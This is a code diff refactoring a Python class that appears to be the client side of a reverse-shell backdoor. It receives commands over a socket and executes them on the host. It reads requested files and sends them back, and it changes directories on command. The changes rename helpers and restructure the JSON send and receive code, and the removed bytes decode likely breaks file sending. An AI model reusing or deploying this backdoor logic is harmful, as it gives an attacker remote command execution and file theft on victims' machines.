@@ -13,20 +13,25 @@ class ihsanbey:
 
 
     def reliable_send(self, data):
-        if isinstance(data, bytes):
-            data = data.decode("utf-8")
         json_data = json.dumps(data)
-        self.connection.send(json_data.encode("utf-8"))
+        byte_data = json_data.encode("utf-8")
+        self.connection.send(byte_data)
 
 
-    def reliable_recieve(self):
+    def reliable_receive(self):
         json_data = b""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
-                return json.loads(json_data.decode("utf-8"))
-            except ValueError: 
+                chunk = self.connection.recv(1024)
+                if not chunk:
+                    break
+                json_data += chunk
+                decoded_data = json_data.decode("utf-8")
+                return json.loads(decoded_data)
+            except ValueError:
                 continue
+
+
 
     def change_dir(self, path):
          os.chdir(path)
@@ -55,7 +60,7 @@ class ihsanbey:
 
     def run(self):
         while True:
-            command = self.reliable_recieve()
+            command = self.reliable_receive()
             
             if command == "!stop":
                 self.connection.close()
@@ -72,8 +77,8 @@ class ihsanbey:
             elif command.startswith("download"):
                 wanted_file_command = command.split(" ")
                 print(wanted_file_command) #dosyanın içinde olanları yazdır ki doğru çalışıyor mu gör
-                command_result = self.read_file(wanted_file_command[1])
-                self.reliable_send(command_result)
+                content = self.read_file(wanted_file_command[1])
+                self.reliable_send(content)
             else:
                 try:    
                     resultt = self.execute_command(command.encode("utf-8"))
@@ -84,7 +89,6 @@ class ihsanbey:
             # except TypeError:
             #     print("type error")
             #     break
-
 
                 
 
